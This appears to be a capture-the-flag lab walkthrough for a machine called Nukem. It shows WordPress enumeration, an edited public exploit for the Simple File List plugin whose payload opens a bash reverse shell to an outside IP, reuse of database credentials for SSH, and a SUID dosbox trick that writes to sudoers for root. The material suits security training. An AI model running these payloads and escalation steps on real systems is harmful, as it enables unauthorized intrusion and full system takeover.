# Nukem

### Enumeration

```
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-title: Retro Gamming &#8211; Just another WordPress site
```

```
wpscan --url http://192.168.210.105/ --api-token [REDACTED]
...
[i] Plugin(s) Identified:

[+] simple-file-list
...
 | Version: 4.2.2 (100% confidence)
 | [!] Title: Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload RCE
...
...
```

```
$ searchsploit WordPress Simple File List
WordPress Plugin Simple File List 4.2.2 - Arbitra | php/webapps/48979.py
$ cp /usr/share/exploitdb/exploits/php/webapps/48979.py .
```

### Initial Access

We need to edit 36th line of 48979.py as follows(be careful with indentation)

```
payload = '<?php passthru("bash -i >& /dev/tcp/192.168.49.210/80 0>&1"); ?>'
```

```
/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', '[REDACTED]' );
```

```
$ ssh commander@192.168.210.105
commander: [REDACTED]
```

### PrivEsc

dosbox has SUID bit.

```
$ dosbox -c 'mount c /etc' -c 'echo commander ALL=(ALL) ALL >> C:\sudoers' -c exit
```
